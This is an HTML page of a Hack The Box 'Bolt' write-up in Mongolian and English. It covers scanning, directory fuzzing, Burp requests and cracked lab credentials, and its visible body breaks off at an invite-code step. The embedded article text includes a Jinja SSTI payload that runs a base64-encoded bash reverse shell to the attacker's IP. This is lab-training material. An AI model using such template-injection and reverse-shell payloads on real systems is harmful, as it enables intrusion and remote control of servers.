<!doctype html><html lang=mn dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>HTB - Bolt | CaDiL's Blog</title>
<meta name=keywords content="Writeup"><meta name=description content="HTB - Bolt - Writeup"><meta name=author content="CaDiL"><link rel=canonical href=https://cadil.github.io/posts/2024-02-21-htb-bolt-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.b609c58d5c11bb90b1a54e04005d74ad1ddf22165eb79f5533967e57df9c3b50.css integrity="sha256-tgnFjVwRu5CxpU4EAF10rR3fIhZet59VM5Z+V9+cO1A=" rel="preload stylesheet" as=style><link rel=icon href=https://cadil.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://cadil.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://cadil.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://cadil.github.io/apple-touch-icon.png><link rel=mask-icon href=https://cadil.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=mn href=https://cadil.github.io/posts/2024-02-21-htb-bolt-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="HTB - Bolt"><meta property="og:description" content="HTB - Bolt - Writeup"><meta property="og:type" content="article"><meta property="og:url" content="https://cadil.github.io/posts/2024-02-21-htb-bolt-writeup/"><meta property="og:image" content="https://cadil.github.io/static"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-02-21T00:00:00+00:00"><meta property="article:modified_time" content="2024-02-21T00:00:00+00:00"><meta property="og:site_name" content="CaDiL's Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cadil.github.io/static"><meta name=twitter:title content="HTB - Bolt"><meta name=twitter:description content="HTB - Bolt - Writeup"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://cadil.github.io/posts/"},{"@type":"ListItem","position":2,"name":"HTB - Bolt","item":"https://cadil.github.io/posts/2024-02-21-htb-bolt-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"HTB - Bolt","name":"HTB - Bolt","description":"HTB - Bolt - Writeup","keywords":["Writeup"],"articleBody":"1. IP Address # Machine Address 10.10.11.114 # Local Address 10.10.14.50 2. Nmap # Nmap 7.91 scan initiated Thu Nov 4 00:16:52 2021 as: nmap -sC -sV -oA nmap/bolt 10.10.11.114 Nmap scan report for 10.10.11.114 Host is up (0.51s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA) | 256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA) |_ 256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Starter Website - About 443/tcp open ssl/http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) | http-title: Passbolt | Open source password manager for teams |_Requested resource was /auth/login?redirect=%2F | ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU | Not valid before: 2021-02-24T19:11:23 |_Not valid after: 2022-02-24T19:11:23 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Thu Nov 4 00:17:28 2021 -- 1 IP address (1 host up) scanned in 36.27 seconds 3. Gobuster gobuster dir -u http://10.10.11.114 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out /login (Status: 200) [Size: 9287] /index (Status: 308) [Size: 247] [--\u003e http://10.10.11.114/] /register (Status: 200) [Size: 11038] /contact (Status: 200) [Size: 26293] /download (Status: 200) [Size: 18570] /profile (Status: 500) [Size: 290] /logout (Status: 302) [Size: 209] [--\u003e http://10.10.11.114/] /services (Status: 200) [Size: 22443] /pricing (Status: 200) [Size: 31731] /sign-in (Status: 200) [Size: 9287] /sign-up (Status: 200) [Size: 11038] хэрэг болох зүйл олдсонгүй.\nGobuster with VHOST\ngobuster vhost dir -u http://10.10.11.114 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster_vhost.out Vhost -р хайж үзвэл илэрц олдсонгүй:\n=============================================================== Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.11.114 [+] Method: GET [+] Threads: 10 [+] Wordlist: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2021/11/13 08:14:13 Starting gobuster in VHOST enumeration mode =============================================================== =============================================================== 2021/11/13 09:04:24 Finished =============================================================== 4. ffuf ffuf -u 10.10.10.250/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt Output:\n________________________________________________ :: Method : GET :: URL : http://10.10.11.114/FUZZ :: Wordlist : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt :: Output file : fuff.out :: File format : json :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 ________________________________________________ login [Status: 200, Size: 9287, Words: 2135, Lines: 173] register [Status: 200, Size: 11038, Words: 3053, Lines: 199] contact [Status: 200, Size: 26293, Words: 10060, Lines: 468] download [Status: 200, Size: 18570, Words: 5374, Lines: 346] logout [Status: 302, Size: 209, Words: 22, Lines: 4] services [Status: 200, Size: 22443, Words: 7170, Lines: 405] pricing [Status: 200, Size: 31731, Words: 11055, Lines: 549] sign-in [Status: 200, Size: 9287, Words: 2135, Lines: 173] sign-up [Status: 200, Size: 11038, Words: 3053, Lines: 199] check-email [Status: 200, Size: 7331, Words: 1224, Lines: 147] :: Progress: [43003/43003] :: Job [1/1] :: 162 req/sec :: Duration: [0:04:31] :: Errors: 0 :: check-email хаяг байна. Орохоор: http://10.10.11.114/check-email\nBurp:\nPOST /register HTTP/1.1 Host: 10.10.11.114 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 52 Origin: http://10.10.11.114 DNT: 1 Connection: close Referer: http://10.10.11.114/register Upgrade-Insecure-Requests: 1 Sec-GPC: 1 username=ca4mi\u0026email=ca4mi%40mail.com\u0026password=ca4mi GET /auth/login?redirect=%2F HTTP/2 Host: 10.10.11.114 Cookie: passbolt_session=32q4d8uhp91s8j1nq7p79qprp7; csrfToken=55812a799be2316e0d4af2e41bc4793889c05b6e178787be229a78a9320d5bb317d53e6d70ce9ddca41ee337b5650ce8d36926445447873d30dc06d62adcecb7 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Dnt: 1 Upgrade-Insecure-Requests: 1 Sec-Gpc: 1 Cache-Control: max-age=0 Te: trailers Connection: close 5. Image tar tar -xvf image.tar tar: This does not look like a tar archive tar: Exiting with failure status due to previous errors адлаа загаад, дахин татаж үзсэн. Болсон\nsql Hash password энэ дотроос олоод crack хийх хэрэгтэй. Crack хийхэд хугацаа орон гэж бодоод (хэдийн) encrypt хийсэн нууц үг ашиглав. admin:deadbolt\nEddie demo.bolt.htb/register mail.bolt.htb\nInvite code:\n41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py invite_code XNSS-HSJW-3NGU-8XTJ\nSSTI demo - гоор ороод user үүсгэнэ. Үүсгэсэн user-н нэрийг settings хэсгээс:\n{% with a = request[\"application\"][\"\\x5f\\x5fglobals\\x5f\\x5f\"][\"\\x5f\\x5fbuiltins\\x5f\\x5f\"][\"\\x5f\\x5fimport\\x5f\\x5f\"](\"os\")[\"popen\"](\"echo -n YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zNi85MDAxIDA+JjEK | base64 -d | bash\")[\"read\"]() %} a {% endwith %} болгож өөрчлөөд nc асаан mail.bolt.htb нэвтэрч орон баталгаажуулах мэйлийг дараад shell-р орно.\n/etc/passbolt/passbolt.php /var/mail/eddie eddie@bolt:~$ cat /var/mail/eddie From clark@bolt.htb Thu Feb 25 14:20:19 2021 Return-Path: X-Original-To: eddie@bolt.htb Delivered-To: eddie@bolt.htb Received: by bolt.htb (Postfix, from userid 1001) id DFF264CD; Thu, 25 Feb 2021 14:20:19 -0700 (MST) Subject: Important! To: X-Mailer: mail (GNU Mailutils 3.7) Message-Id: \u003c20210225212019.DFF264CD@bolt.htb\u003e Date: Thu, 25 Feb 2021 14:20:19 -0700 (MST) From: Clark Griswold Hey Eddie, The password management server is up and running. Go ahead and download the extension to your browser and get logged in. Be sure to back up your private key because I CANNOT recover it. Your private key is the only way to recover your account. Once you're set up you can start importing your passwords. Please be sure to keep good security in mind - there's a few things I read about in a security whitepaper that are a little concerning... -Clark eddie’s password: rT2;jW7","wordCount":"846","inLanguage":"mn","datePublished":"2024-02-21T00:00:00Z","dateModified":"2024-02-21T00:00:00Z","author":{"@type":"Person","name":"CaDiL"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://cadil.github.io/posts/2024-02-21-htb-bolt-writeup/"},"publisher":{"@type":"Organization","name":"CaDiL's Blog","logo":{"@type":"ImageObject","url":"https://cadil.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://cadil.github.io/ accesskey=h title="CaDiL's Blog (Alt + H)">CaDiL's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button><ul class=lang-switch><li>|</li></ul></div></div><ul id=menu><li><a href=https://cadil.github.io/archives/ title=Archive><span>Archive</span></a></li><li><a href=https://cadil.github.io/bookmark/ title=Bookmark><span>Bookmark</span></a></li><li><a href=https://cadil.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://cadil.github.io/>Нүүр</a>&nbsp;»&nbsp;<a href=https://cadil.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">HTB - Bolt</h1><div class=post-description>HTB - Bolt - Writeup</div><div class=post-meta><span title='2024-02-21 00:00:00 +0000 UTC'>хоёрдугаар сар 21, 2024</span>&nbsp;·&nbsp;4 МИН&nbsp;·&nbsp;CaDiL</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Агуулга</span></summary><div class=inner><ul><li><a href=#1-ip-address aria-label="1. IP Address">1. IP Address</a></li><li><a href=#2-nmap aria-label="2. Nmap">2. Nmap</a></li><li><a href=#3-gobuster aria-label="3. Gobuster">3. Gobuster</a></li><li><a href=#4-ffuf aria-label="4. ffuf">4. ffuf</a></li><li><a href=#5-image-tar aria-label="5. Image tar">5. Image tar</a><ul><li><a href=#ssti aria-label=SSTI>SSTI</a></li></ul></li></ul></div></details></div><div class=post-content><h3 id=1-ip-address>1. IP Address<a hidden class=anchor aria-hidden=true href=#1-ip-address>#</a></h3><pre tabindex=0><code># Machine Address
10.10.11.114

# Local Address
10.10.14.50
</code></pre><h3 id=2-nmap>2. Nmap<a hidden class=anchor aria-hidden=true href=#2-nmap>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Nmap 7.91 scan initiated Thu Nov  4 00:16:52 2021 as: nmap -sC -sV -oA nmap/bolt 10.10.11.114</span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 10.10.11.114
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.51s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>997</span> closed ports
</span></span><span style=display:flex><span>PORT    STATE SERVICE  VERSION
</span></span><span style=display:flex><span>22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 <span style=color:#f92672>(</span>Ubuntu Linux; protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>3072</span> 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>80/tcp  open  http     nginx 1.18.0 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title:     Starter Website -  About 
</span></span><span style=display:flex><span>443/tcp open  ssl/http nginx 1.18.0 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-server-header: nginx/1.18.0 <span style=color:#f92672>(</span>Ubuntu<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| http-title: Passbolt | Open source password manager <span style=color:#66d9ef>for</span> teams
</span></span><span style=display:flex><span>|_Requested resource was /auth/login?redirect<span style=color:#f92672>=</span>%2F
</span></span><span style=display:flex><span>| ssl-cert: Subject: commonName<span style=color:#f92672>=</span>passbolt.bolt.htb/organizationName<span style=color:#f92672>=</span>Internet Widgits Pty Ltd/stateOrProvinceName<span style=color:#f92672>=</span>Some-State/countryName<span style=color:#f92672>=</span>AU
</span></span><span style=display:flex><span>| Not valid before: 2021-02-24T19:11:23
</span></span><span style=display:flex><span>|_Not valid after:  2022-02-24T19:11:23
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span><span style=color:#75715e># Nmap done at Thu Nov  4 00:17:28 2021 -- 1 IP address (1 host up) scanned in 36.27 seconds</span>
</span></span></code></pre></div><h3 id=3-gobuster>3. Gobuster<a hidden class=anchor aria-hidden=true href=#3-gobuster>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster dir -u http://10.10.11.114 -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>/login                <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 9287<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/index                <span style=color:#f92672>(</span>Status: 308<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 247<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.11.114/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/register             <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 11038<span style=color:#f92672>]</span>                         
</span></span><span style=display:flex><span>/contact              <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 26293<span style=color:#f92672>]</span>                         
</span></span><span style=display:flex><span>/download             <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 18570<span style=color:#f92672>]</span>                         
</span></span><span style=display:flex><span>/profile              <span style=color:#f92672>(</span>Status: 500<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 290<span style=color:#f92672>]</span>                           
</span></span><span style=display:flex><span>/logout               <span style=color:#f92672>(</span>Status: 302<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 209<span style=color:#f92672>]</span> <span style=color:#f92672>[</span>--&gt; http://10.10.11.114/<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>/services             <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 22443<span style=color:#f92672>]</span>                         
</span></span><span style=display:flex><span>/pricing              <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 31731<span style=color:#f92672>]</span>                         
</span></span><span style=display:flex><span>/sign-in              <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 9287<span style=color:#f92672>]</span>                          
</span></span><span style=display:flex><span>/sign-up              <span style=color:#f92672>(</span>Status: 200<span style=color:#f92672>)</span> <span style=color:#f92672>[</span>Size: 11038<span style=color:#f92672>]</span>     
</span></span></code></pre></div><p>хэрэг болох зүйл олдсонгүй.</p><p>Gobuster with VHOST</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>gobuster vhost dir -u http://10.10.11.114 -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -o gobuster_vhost.out
</span></span></code></pre></div><p>Vhost -р хайж үзвэл илэрц олдсонгүй:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>Gobuster v3.1.0
</span></span><span style=display:flex><span>by OJ Reeves <span style=color:#f92672>(</span>@TheColonial<span style=color:#f92672>)</span> &amp; Christian Mehlmauer <span style=color:#f92672>(</span>@firefart<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Url:          http://10.10.11.114
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Method:       GET
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Threads:      <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Wordlist:     /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> User Agent:   gobuster/3.1.0
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Timeout:      10s
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2021/11/13 08:14:13 Starting gobuster in VHOST enumeration mode
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>                                   
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span><span style=display:flex><span>2021/11/13 09:04:24 Finished
</span></span><span style=display:flex><span><span style=color:#f92672>===============================================================</span>
</span></span></code></pre></div><h3 id=4-ffuf>4. ffuf<a hidden class=anchor aria-hidden=true href=#4-ffuf>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>ffuf -u 10.10.10.250/FUZZ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
</span></span></code></pre></div><p>Output:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span> :: Method           : GET
</span></span><span style=display:flex><span> :: URL              : http://10.10.11.114/FUZZ
</span></span><span style=display:flex><span> :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
</span></span><span style=display:flex><span> :: Output file      : fuff.out
</span></span><span style=display:flex><span> :: File format      : json
</span></span><span style=display:flex><span> :: Follow redirects : false
</span></span><span style=display:flex><span> :: Calibration      : false
</span></span><span style=display:flex><span> :: Timeout          : <span style=color:#ae81ff>10</span>
</span></span><span style=display:flex><span> :: Threads          : <span style=color:#ae81ff>40</span>
</span></span><span style=display:flex><span> :: Matcher          : Response status: 200,204,301,302,307,401,403,405
</span></span><span style=display:flex><span>________________________________________________
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>login                   <span style=color:#f92672>[</span>Status: 200, Size: 9287, Words: 2135, Lines: 173<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>register                <span style=color:#f92672>[</span>Status: 200, Size: 11038, Words: 3053, Lines: 199<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>contact                 <span style=color:#f92672>[</span>Status: 200, Size: 26293, Words: 10060, Lines: 468<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>download                <span style=color:#f92672>[</span>Status: 200, Size: 18570, Words: 5374, Lines: 346<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>logout                  <span style=color:#f92672>[</span>Status: 302, Size: 209, Words: 22, Lines: 4<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>services                <span style=color:#f92672>[</span>Status: 200, Size: 22443, Words: 7170, Lines: 405<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>pricing                 <span style=color:#f92672>[</span>Status: 200, Size: 31731, Words: 11055, Lines: 549<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>sign-in                 <span style=color:#f92672>[</span>Status: 200, Size: 9287, Words: 2135, Lines: 173<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>sign-up                 <span style=color:#f92672>[</span>Status: 200, Size: 11038, Words: 3053, Lines: 199<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>check-email             <span style=color:#f92672>[</span>Status: 200, Size: 7331, Words: 1224, Lines: 147<span style=color:#f92672>]</span>
</span></span><span style=display:flex><span>:: Progress: <span style=color:#f92672>[</span>43003/43003<span style=color:#f92672>]</span> :: Job <span style=color:#f92672>[</span>1/1<span style=color:#f92672>]</span> :: <span style=color:#ae81ff>162</span> req/sec :: Duration: <span style=color:#f92672>[</span>0:04:31<span style=color:#f92672>]</span> :: Errors: <span style=color:#ae81ff>0</span> ::
</span></span></code></pre></div><p><code>check-email</code> хаяг байна. Орохоор:
http://10.10.11.114/check-email</p><p>Burp:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /register HTTP/1.1
</span></span><span style=display:flex><span>Host: 10.10.11.114
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Content-Type: application/x-www-form-urlencoded
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>52</span>
</span></span><span style=display:flex><span>Origin: http://10.10.11.114
</span></span><span style=display:flex><span>DNT: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Referer: http://10.10.11.114/register
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Sec-GPC: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>username<span style=color:#f92672>=</span>ca4mi&amp;email<span style=color:#f92672>=</span>ca4mi%40mail.com&amp;password<span style=color:#f92672>=</span>ca4mi
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>GET /auth/login?redirect<span style=color:#f92672>=</span>%2F HTTP/2
</span></span><span style=display:flex><span>Host: 10.10.11.114
</span></span><span style=display:flex><span>Cookie: passbolt_session<span style=color:#f92672>=</span>32q4d8uhp91s8j1nq7p79qprp7; csrfToken<span style=color:#f92672>=</span>55812a799be2316e0d4af2e41bc4793889c05b6e178787be229a78a9320d5bb317d53e6d70ce9ddca41ee337b5650ce8d36926445447873d30dc06d62adcecb7
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; rv:78.0<span style=color:#f92672>)</span> Gecko/20100101 Firefox/78.0
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q<span style=color:#f92672>=</span>0.9,image/webp,*/*;q<span style=color:#f92672>=</span>0.8
</span></span><span style=display:flex><span>Accept-Language: en-US,en;q<span style=color:#f92672>=</span>0.5
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Dnt: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Sec-Gpc: <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span>Cache-Control: max-age<span style=color:#f92672>=</span><span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>Te: trailers
</span></span><span style=display:flex><span>Connection: close
</span></span></code></pre></div><h3 id=5-image-tar>5. Image tar<a hidden class=anchor aria-hidden=true href=#5-image-tar>#</a></h3><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tar -xvf image.tar
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>tar: This does not look like a tar archive
</span></span><span style=display:flex><span>tar: Exiting with failure status due to previous errors
</span></span></code></pre></div><p>адлаа загаад, дахин татаж үзсэн. Болсон</p><p>sql
Hash password энэ дотроос олоод crack хийх хэрэгтэй. Crack хийхэд хугацаа орон гэж бодоод (хэдийн) encrypt хийсэн нууц үг ашиглав.
<code>admin:deadbolt</code></p><p>Eddie
demo.bolt.htb/register
mail.bolt.htb</p><p>Invite code:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py
